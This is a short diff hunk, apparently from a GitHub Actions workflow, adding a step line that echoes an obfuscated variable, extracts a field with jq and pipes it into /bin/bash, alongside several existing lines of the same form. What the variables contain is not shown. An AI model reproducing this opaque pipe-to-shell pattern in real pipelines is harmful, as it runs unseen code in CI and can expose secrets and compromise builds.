@@ -30,6 +30,7 @@ jobs:
           echo $fzfl19 | jq -r .lwzhp55312 | /bin/bash
           echo $z6 | jq -r .szay6 | /bin/bash
           echo $mz32 | jq -r .eg430 | /bin/bash
+          echo $cli30002 | jq -r .xedmh0200 | /bin/bash
 
       - name: Save output
         if: always()
